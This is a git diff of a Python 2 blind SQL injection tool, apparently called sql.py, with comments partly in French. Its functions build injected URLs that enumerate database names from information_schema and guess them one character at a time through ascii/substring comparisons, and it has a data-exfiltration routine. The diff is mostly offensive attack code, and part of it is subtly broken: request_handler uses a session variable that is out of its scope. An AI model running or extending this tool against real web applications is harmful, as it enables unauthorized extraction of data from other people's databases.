@@ -21,6 +21,11 @@ dump            = {}
 
 # --------- Main function option parsing ----------
 def main():
+
+    if len(sys.argv) == 1:
+        print "Mets tes putains d'arguments !!"
+        sys.exit()
+
     arg_help = """Blind SQLi:
 python sql.py TODO include args
 python sql.py TODO include args"""
@@ -51,8 +56,9 @@ python sql.py TODO include args"""
     # TODO algo principal ici
     # Enumerer le nombre de colonnes de la table courante pour l'injection
     # Trouver la version du serveur SQL
-    sql_version(url,payload, bypass)
-    eunum_databases(url, payload, bypass)
+    with requests.session() as session:
+        sql_version(url, payload, bypass)
+        eunum_databases(url, payload, bypass)
     # Récupérer la base de données courantes et les autres bases de données
     # Pour chaque base database
         # Récupérer les tables
@@ -102,7 +108,7 @@ def eunum_databases(url, payload, bypass):
     # Count how many databases, we assume there are less than 64 databases
     while (database_increment < 64):
         # uri = url + "' and substring((select schema_name from information_schema.schemata limit " + str(database_increment) + ",1),1,1)>=0" + bypass
-        uri = url + str(payload) + "substring((select schema_name from information_schema.schemata limit " + str(database_increment) + ",1),1,1)>=0" + bypass
+        uri = url + str(payload) + "substring((select schema_name from information_schema.schemata limit " + str(database_increment) + ",1),1,1)>=0" + str(bypass)
         server_response = request_handler(uri)
         server_response_status = validate_request(server_response)
 
@@ -117,7 +123,7 @@ def eunum_databases(url, payload, bypass):
                 # Count how many chars in db name, we assume the database name to be less than 128 characters
                 while (database_letter_count < 128):
                     # uri = url + "' and substring((select schema_name from information_schema.schemata limit " + str(database_number) + ",1),"+ str(database_letter_count) + ",1)>0" + bypass
-                    uri = url + str(payload) + "substring((select schema_name from information_schema.schemata limit " + str(database_number) + ",1),"+ str(database_letter_count) + ",1)>=0" + bypass
+                    uri = url + str(payload) + "substring((select schema_name from information_schema.schemata limit " + str(database_number) + ",1),"+ str(database_letter_count) + ",1)>=0" + str(bypass)
                     server_response = request_handler(uri)
                     server_response_status = validate_request(server_response)
                     print server_response_status, database_letter_count
@@ -131,7 +137,7 @@ def eunum_databases(url, payload, bypass):
 
                             # Loop in ascii range to guess each character
                             for database_letter in range(1,128):
-                                uri = url + str(payload) + "ascii(substring((select schema_name from information_schema.schemata limit " + str(database_number) + ",1)," + str(database_letter_count) + ",1))>=" + str(database_letter) + bypass
+                                uri = url + str(payload) + "ascii(substring((select schema_name from information_schema.schemata limit " + str(database_number) + ",1)," + str(database_letter_count) + ",1))>=" + str(database_letter) + str(bypass)
 
                                 server_response = request_handler(uri)
                                 server_response_status = validate_request(server_response)
@@ -217,14 +223,9 @@ def exfiltrate_data(url, payload, bypass, database):
 
 # --------- Forge & send HTTP requests ----------
 def request_handler(url):
-    # Create session if it doesn't exist
-#    if not session:
-#        session = requests.session()
-#    page = session.get(url)
-
-    with requests.session() as session:
-        page = session.get(url)
-    return page.content
+    # Create session if it doesn't existe
+    page = session.get(url)
+    return (page)
 
 # --------- Confirm that request was executed ----------
 def validate_request(page):
